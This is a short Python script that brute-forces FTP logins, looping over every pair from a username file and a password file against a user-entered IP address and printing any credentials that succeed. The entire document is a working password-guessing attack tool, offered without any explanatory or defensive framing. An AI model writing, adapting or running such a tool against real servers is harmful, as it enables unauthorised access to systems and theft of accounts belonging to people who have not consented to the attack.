import sys
import ftplib


def ftp_bf(ip,user,password):
    ftp = ftplib.FTP(ip)
    try:
        ftp.login(user,password)
        ftp.quit()
        print("Login successful")
        print(f'User: {user}, Password: {password}')
    except:
        print("Authentication error")


def main():
    ip = input("Enter the ip address")
    users = open("users.txt","r")
    users = users.read().split("\n")
    passwords = open("password.txt","r")
    passwords = passwords.read().split("\n")
    
    for user in users:
        for password in passwords:
            ftp_bf(ip,user,password)
            

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()